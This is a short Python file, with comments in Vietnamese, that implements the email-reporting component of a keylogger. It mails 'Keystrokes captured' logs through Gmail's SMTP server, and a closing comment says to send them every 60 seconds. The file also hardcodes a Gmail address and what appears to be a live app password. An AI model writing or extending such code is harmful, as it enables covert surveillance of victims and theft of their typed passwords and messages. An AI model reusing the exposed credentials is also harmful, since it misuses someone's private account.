import smtplib
import ssl
from email.message import EmailMessage
import time
import threading

# --- CẤU HÌNH EMAIL ---
EMAIL_SENDER = "phatng1010@gmail.com"      # Email dùng để gửi log
EMAIL_PASSWORD = "hajq deja ofdb miey"              # Mật khẩu ứng dụng 16 ký tự
EMAIL_RECEIVER = "phatng1010@gmail.com"  # Email của bạn để nhận log
# ----------------------

def send_email(log_content):
    """Hàm gửi log qua email"""
    subject = "Keylogger Report"
    body = f"Keystrokes captured:\n\n{log_content}"

    # Tạo đối tượng email
    em = EmailMessage()
    em['From'] = EMAIL_SENDER
    em['To'] = EMAIL_RECEIVER
    em['Subject'] = subject
    em.set_content(body)

    # Thiết lập kết nối an toàn với server Gmail
    context = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(em)
            print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# --- VÍ DỤ TÍCH HỢP VÀO LOGIC GỬI LOG ĐỊNH KỲ ---
# Trong luồng chính của bạn, cứ mỗi 60 giây, hãy đọc nội dung log và gọi hàm send_email(keystrokes)
